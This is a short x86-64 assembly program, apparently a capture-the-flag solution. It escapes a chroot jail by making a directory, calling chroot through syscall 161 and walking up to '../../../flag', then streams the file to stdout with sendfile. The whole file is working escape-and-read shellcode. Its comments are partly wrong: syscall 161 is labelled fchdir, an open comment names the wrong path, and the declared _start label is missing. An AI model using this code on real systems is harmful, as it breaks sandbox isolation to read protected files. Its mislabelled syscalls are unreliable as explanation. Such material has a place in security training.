.globl _start
.intel_syntax noprefix

_get_flag:

    mov rax, 83         # SYS_mkdir
    lea rdi, [rip+dir]  # mkdir /dir
    syscall

    mov rax, 161        # SYS_fchdir
    lea rdi, [rip+dir]  # File opened as arg
    syscall             # trigger fchdir(3)

    mov rax, 2          # syscall number of open
    lea rdi, [rip+flag] # point the first argument at stack (where we have "./flag")
    mov rsi, 0          # NULL out the second argument (meaning, O_RDONLY)
    syscall             # trigger open("/flag", NULL)

    mov rdi, 1          # first argument to sendfile is the file descriptor to output to (stdout)
    mov rsi, rax        # second argument is the file descriptor returned by open
    mov rdx, 0          # third argument is the number of bytes to skip from the input file
    mov r10, 1000       # fourth argument is the number of bytes to transfer to the output file
    mov rax, 40         # syscall number of sendfile
    syscall             # trigger sendfile(1, fd, 0, 1000)

    mov rax, 60         # syscall number of exit
    syscall             # trigger exit()

flag:
    .string "../../../flag"

dir:
    .string "/dir"

